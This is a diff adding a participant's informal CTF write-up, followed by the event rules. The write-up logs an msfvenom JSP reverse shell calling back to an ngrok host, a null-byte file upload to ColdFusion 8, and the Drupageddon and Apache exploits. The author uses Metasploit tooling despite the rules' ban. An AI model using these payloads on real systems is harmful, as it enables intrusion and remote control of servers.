@@ -1,0 +1,132 @@
+=================================================================================================
+													******** Digital Encode CTF ********
+==================================================================================================
+-- Hacking:
+===========
+1) User hunt:
+Default admin creds of admin:admin for adobe coldfusion 8 admin let me into the admin dashboard.
+** msfvenom -p java/jsp_shell_reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=16373 -o newt4.jsp
+
+** https://digitalencode-servicecoldfusion.chals.io/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/newt4.jsp%00
+
+** ngrok tcp 4443
+** tcp://0.tcp.eu.ngrok.io:16378
+
+I got in via defualt creds of adin:admin, then i searched for the exploit of coldfusion 8. I got an RCE 
+exploit located at 50057.py, viewed the POC, edited to my tast, used burp to send a post request to the
+vuln upload endpint, got it uploaded, view the list of uploaded file, setup ngrok to listen to my 
+exploit, clicked on my uploaded file, got a connetcion, viewed /etc/passwd file, got the flag.
+
+2) SysAdmin:
+Viweing source code of app, I could see that the CMS is drupal 7. Searchnig google for an exploit on 
+this, give me the drupageddon exploit. got the raw exploit, saved on my system, run the ruby scriot and 
+got RCe. fro there i got the flag.
+** ruby /home/demola/druper.rb https://digitalencode-servicedrupal.chals.io --verbose
+
+3) Burgundy:
+On the default/index page, i get a "it works!". This looks like apache!. Next i do directory enum, found
+an icons path, view the dir listing od icons, found the version of apache being used, serch for an 
+exploit on it, ran the exploit and i got in!! and got the flag.
+** export URL=https://digitalencode-servicehttpd.chals.io/FUZZ/
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hl 0 "$URL"
+** searchsploit apache 2.4 remote
+** python3 50512.py https://digitalencode-servicehttpd.chals.io
+
+4) Savage:
+On access the index page, i got a json response, from the URL is could see that it used elastic search,
+googleing explot for elastic search, i stunbled upon hectrick's elsatic search, going to the elastic 
+info section, I tried out the /_cat/nodes endoint and got the hostname.
+
+5) 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+This is a reminder on the rules for this CTF:
+
+Fair Play: We expect all contestants to embrace the spirit of fair play and refrain from engaging in any unethical or malicious activities during the competition. Any violation of fair play will result in immediate disqualification.
+Team Size: Each team may consist of 3 members. Solo participants are also welcome. If you are contesting as a team, the team captain needs to create the team, and share the team name and password to the team members, so they can join the team. Registration on the hackathon platform must be completed using the same information provided during the first stage's registration. Failure to comply could result in disqualification.
+Flag Submission: Throughout the competition, participants will encounter challenges with hidden flags. When you find a flag, submit it through the designated platform to earn points. The flag format will be clearly defined in each challenge.
+Collaboration: While collaboration among teammates is encouraged, sharing flags or solutions between teams is strictly prohibited. Automation tools like Metasploit, Nessus, Invicti etc. are not allowed during this competition.
+Disruptions: Any attempts to disrupt the competition platform or compromise the experience for other participants will not be tolerated and will lead to disqualification.
+Communication: During the CTF, external help or discussions on public forums related to ongoing challenges are not allowed.
+Reporting Issues: If you encounter any technical issues or have concerns during the competition, promptly reach out to the organizers for assistance at info@dehackathon.online
+Report Submissions: You are required to submit a detailed walkthrough within 48 hours of the competition to info@dehackathon.online. The walkthrough must be clear enough for a non-technical person to reproduce your exploit with your report. Upon report submission, there will be a code that be sent to you to earn a bonus point. Please note that this code is valid for 30 minutes, after which it will expire, and you will no longer have access to a new code.
+Scoring and Winners: The final results will be based on the total points earned throughout the competition. The team with the highest score will be declared the winner and awarded.
+
+
+
+
+
+
+
